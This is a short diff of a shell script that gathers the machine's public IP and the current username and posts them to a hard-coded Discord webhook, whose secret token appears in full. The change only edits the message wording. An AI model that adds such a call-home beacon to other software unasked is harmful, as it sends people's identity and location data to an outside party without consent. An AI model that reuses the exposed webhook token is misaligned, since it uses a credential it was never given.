@@ -4,4 +4,4 @@ _DIGIP=`dig +short myip.opendns.com @resolver1.opendns.com`
 _HOSTIP=`host myip.opendns.com resolver1.opendns.com`
 _CURLIP=`curl ident.me`
 _IAMWHO=`whoami`
-curl -d "{\"content\": \"tis $_IAMWHO calling in from: $_DIGIP - $_HOSTIP - $_CURLIP\"}" -H "Content-Type: application/json" https://discordapp.com/api/webhooks/740724486890061864/KhLvbVrjSbTmLH-8i_m8r-wDoorccoiV47jbeOjq_UUzmkaF5m1F2d7Cc-6GvNL2UING
+curl -d "{\"content\": \"tis $_IAMWHO calling in from $_DIGIP - $_HOSTIP - $_CURLIP\"}" -H "Content-Type: application/json" https://discordapp.com/api/webhooks/740724486890061864/KhLvbVrjSbTmLH-8i_m8r-wDoorccoiV47jbeOjq_UUzmkaF5m1F2d7Cc-6GvNL2UING
